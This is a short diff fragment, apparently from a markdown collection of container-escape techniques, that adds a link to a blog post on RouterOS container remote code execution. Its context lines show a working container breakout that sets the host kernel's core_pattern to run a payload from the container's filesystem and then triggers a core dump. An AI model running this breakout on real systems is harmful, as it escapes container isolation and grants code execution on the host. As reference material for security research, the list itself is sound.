@@ -271,3 +271,4 @@ lxc restart foo
     echo '|/var/lib/docker/overlay2/.../diff/poc' > /proc/sys/kernel/core_pattern # poc on container's /
     sh -c 'kill -11 $$' # trigger coredump, execs poc on host
     ```
+- https://nns.ee/blog/2022/08/05/routeros-container-rce.html
